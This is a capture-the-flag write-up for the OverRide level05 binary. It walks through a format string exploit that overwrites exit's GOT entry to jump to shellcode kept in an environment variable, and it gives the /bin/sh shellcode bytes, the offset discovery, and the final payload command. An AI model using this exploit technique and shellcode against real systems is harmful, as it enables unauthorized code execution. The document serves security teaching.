Here the program simply takes an entry, then lowercase it and display it with a printf.

So what we're going to do here is to exploit the printf with a format string exploit to overwrite the GOT address of the return main function.
We are going to modify the return address so it will now points to an env variable where we stored our shellcode.

So first let's store our shellcode in a env variable. It's the shellcode which opens a shell that we used on many previous exercices.

export SHELLCODE=$(python -c 'print("\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')

We are going to find its address thanks to gdb and we get something around 0xffffd80c. We put a nopsled of a length of 200 which allows us to be approximative.

Now let's find the offset of the printf.

level05@OverRide:~$ ./level05
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078

We can see there is an offset of 10.

With a disas of the main and a disas of the address of exit we find that the GOT address of the exit is : 0x080497e0

(gdb) disas main
[...]
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
   
(gdb) disas 0x8048370
   0x08048370 <+0>:     jmp    *0x80497e0

So now we're going to write our exploit format string.

Here we are going to use 2 address 0x080497e0 and 0x080497e2 for just overwrite the value pointed by 0x080497e0.
This is because the address of our shellcode which is 0xffffd80c is bigger than the int max value.
So the first address 0x080497e0 will allows us to write the last 2 bytes : 0xd80c and the second one 0x080497e2 to write the first 2 bytes : 0xffff.

0xd80c = 55308. 55308 - 8 (4 * 2 byte long address) = 55300
0xffff = 0xffff-0xd80c = 10227

(python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55310x' + '%10\$n' + '%10217x' + '%11\$n'" ; cat - ) | ./level05

As you can see we modified a bit our values +10 for the first and -10 for the second because our address 0xffffd80c was a little bit off.
It was probably the address of the index of the shellcode.
